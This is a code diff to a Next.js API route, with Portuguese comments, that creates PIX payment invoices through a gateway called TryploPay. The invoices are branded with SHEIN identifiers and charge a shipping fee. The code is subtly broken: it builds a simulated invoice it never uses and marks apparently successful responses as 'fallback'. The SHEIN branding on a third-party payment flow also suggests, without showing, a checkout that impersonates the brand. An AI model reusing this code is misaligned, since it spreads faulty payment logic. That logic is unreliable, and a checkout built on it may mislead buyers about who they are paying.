@@ -166,6 +166,9 @@ export async function POST(request: NextRequest) {
     // Usar o valor exato do frete selecionado
     const totalAmount = Number.parseFloat(amount.toString())
 
+    // Gerar external_id único para rastreamento
+    const externalId = `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
+
     // Preparar payload oficial da TryploPay
     const invoicePayload = {
       client: {
@@ -186,10 +189,10 @@ export async function POST(request: NextRequest) {
       },
       payment: {
         product_type: 1, // Produto digital
-        id: `SHEIN_${Date.now()}`, // ID interno
+        id: externalId, // ID interno único
         type: "3", // PIX (string conforme documentação)
         due_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0], // 24 horas
-        referer: `SHEIN_CARD_${Date.now()}`,
+        referer: externalId, // Referência para rastreamento
         installments: "1", // String conforme documentação
         order_url: `${request.nextUrl.origin}/checkout`,
         store_url: request.nextUrl.origin,
@@ -253,9 +256,42 @@ export async function POST(request: NextRequest) {
       throw new Error("Modo simulação ativado")
     }
 
+    const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.example.com/qr/v2/SIMULATED${Date.now()}5204000053039865406${totalAmount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304ABCD`
+
+    const simulatedInvoice = {
+      id: `SIM_${Date.now()}`,
+      invoice_id: `SIMULATED_${Date.now()}`,
+      external_id: externalId, // Adicionar external_id
+      pix: {
+        payload: simulatedPixCode,
+        image: `/placeholder.svg?height=250&width=250`,
+        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(simulatedPixCode)}`,
+      },
+      status: {
+        code: 1,
+        title: "Aguardando Pagamento",
+        text: "pending",
+      },
+      valores: {
+        bruto: Math.round(totalAmount * 100), // em centavos
+        liquido: Math.round(totalAmount * 100),
+      },
+      vencimento: {
+        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
+      },
+      secure: {
+        id: `simulated-${Date.now()}`,
+        url: `${request.nextUrl.origin}/checkout`,
+      },
+      type: "simulated",
+    }
+
+    console.log(`✅ Fatura simulada criada - Valor: R$ ${totalAmount.toFixed(2)}`)
+
     return NextResponse.json({
       success: true,
       data: invoiceData,
+      fallback: true,
     })
   } catch (error) {
     console.log("❌ Erro ao criar fatura, usando fallback:", error)
@@ -265,12 +301,16 @@ export async function POST(request: NextRequest) {
     const { amount, shipping, method } = body
     const totalAmount = Number.parseFloat(amount?.toString() || "34.90")
 
+    // Gerar external_id único para rastreamento
+    const externalId = `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
+
     // Fallback para simulação
     const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.example.com/qr/v2/SIMULATED${Date.now()}5204000053039865406${totalAmount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304ABCD`
 
     const simulatedInvoice = {
       id: `SIM_${Date.now()}`,
       invoice_id: `SIMULATED_${Date.now()}`,
+      external_id: externalId, // Adicionar external_id
       pix: {
         payload: simulatedPixCode,
         image: `/placeholder.svg?height=250&width=250`,
